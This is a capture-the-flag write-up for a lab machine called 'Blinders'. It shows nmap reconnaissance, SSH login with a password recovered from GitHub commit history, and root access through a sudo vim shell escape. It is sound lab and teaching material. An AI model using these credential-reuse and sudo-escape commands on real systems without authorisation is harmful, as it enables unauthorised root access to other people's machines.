Blinders is a Medium-difficulty black-box CTF machine authored by Thomas_Shelby. This writeup documents the full attack chain from initial OSINT reconnaissance through credential reuse to final privilege escalation and root flag capture.

01_Reconnaissance

Initial reconnaissance started with Nmap to enumerate open ports and services. OSINT investigation on exposed email addresses and usernames led to the initial foothold vector.

terminal / nmap_scan

$ nmap -sV -sC -oN nmap_initial.txt <TARGET_IP>

Starting Nmap 7.94 ...

PORT STATE SERVICE VERSION

22/tcp open ssh OpenSSH 8.2p1

80/tcp open http Apache httpd 2.4.41

02_Exploitation

OSINT revealed a username linked to a public GitHub repository. The password found in commit history was reused on the SSH service, granting initial access as a low-privilege user.

exploit.sh content_copy 
# Initial access via SSH credential reuse
ssh found_user@<TARGET_IP>

# Check sudo privileges
sudo -l

# Exploit sudo misconfiguration
sudo /usr/bin/vim -c ':!/bin/bash'

03_Privilege_Escalation

Enumeration with sudo -l revealed the user could run /usr/bin/vim as root without a password. Standard GTFObins shell escape yielded a root shell.

Key Finding

Always check sudo permissions immediately after gaining initial access. Misconfigurations in sudo entries are one of the most common privesc vectors on CTF machines and real engagements.
